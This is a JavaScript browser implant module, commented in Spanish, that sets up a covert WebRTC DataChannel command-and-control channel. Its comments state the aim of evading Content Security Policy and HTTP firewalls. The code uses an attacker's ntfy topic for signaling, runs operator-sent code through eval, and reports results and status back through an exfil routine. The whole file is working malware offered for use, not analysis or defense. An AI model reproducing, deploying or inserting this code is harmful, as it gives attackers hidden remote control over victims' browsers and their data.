/* m-webrtc-c2.js — WebRTC DataChannel C2 (Sansec 2026). Bypassa CSP connect-src (RTCPeerConnection
   no cubierto) y firewalls HTTP (DTLS-encrypted UDP). Canal stealth backup. Signaling vía ntfy (1 vez). */
(function(G){
if(!G)return; if(G._M&&G._M.wc2)return; G._M=G._M||{}; G._M.wc2=1;
var exfil=G.exfil, hx=(window.__GE_OFF__&&window.__GE_OFF__.hx)||function(){};
var OFF=window.__GE_OFF__||{};
var NTFY=OFF.C&&OFF.C.NTFY, TOKEN=OFF.C&&OFF.C.STAGER_TOKEN;
var VID=(OFF.id)||'anon';
try{
if(!window.RTCPeerConnection||!NTFY){exfil('wc2',{available:false,reason:!window.RTCPeerConnection?'no-rtc':'no-ntfy'});return}
var OFFER_T=NTFY+'-wc-offer', ANSWER_T=NTFY+'-wc-answer';
var pc=new RTCPeerConnection({iceServers:[]}); // sin STUN → stealth puro en LAN; el operador peer conoce la IP
var dc=pc.createDataChannel('ge',{ordered:false});
dc.onopen=function(){exfil('wc2-open',{st:'open',id:VID});window.__GE__._wcDC=dc;
dc.onmessage=function(ev){try{var cmd=JSON.parse(ev.data);
if(cmd.token!==TOKEN)return;
if(cmd.type==='eval'){try{var rr=eval('('+cmd.code+')');Promise.resolve(rr).then(function(rv){dc.send(JSON.stringify({cmdId:cmd.id,r:String(rv).slice(0,800),vid:VID}))}).catch(function(e){dc.send(JSON.stringify({cmdId:cmd.id,err:e.message,vid:VID}))})}catch(e){}}
}catch(e){}};
};
pc.onicecandidate=function(e){
if(!e.candidate){
// offer completo (SDP + candidates) → publicar para que el operador peer responda
var offer=pc.localDescription;
fetch(OFFER_T,{method:'POST',headers:{'Title':'OFFER:'+VID,'MessageId':VID},body:JSON.stringify({type:offer.type,sdp:offer.sdp,vid:VID})}).catch(function(){});
}};
// escuchar answer del operador via SSE
var es=new EventSource(ANSWER_T+'/sse');
es.onmessage=function(ev){
try{var env=JSON.parse(ev.data);
if(env.event==='message'&&env.message){
var ans=JSON.parse(env.message);
if(ans.vid===VID&&ans.type==='answer'){
pc.setRemoteDescription({type:'answer',sdp:ans.sdp}).catch(function(e){exfil('wc2-err',{m:'setRemote:'+e.message})});
}
}}catch(e){}};
// iniciar handshake
pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).then(function(){
// trickle ICE vacío → onicecandidate(null) dispara el flush del offer
try{pc.addIceCandidate({candidate:''})}catch(e){}
}).catch(function(e){exfil('wc2-err',{m:'offer:'+e.message})});
setTimeout(function(){exfil('wc2-state',{dcState:dc.readyState,pcState:pc.connectionState})},8000);
}catch(e){hx('m-wc2-err',{m:e.message})}
})(window.__GE__);
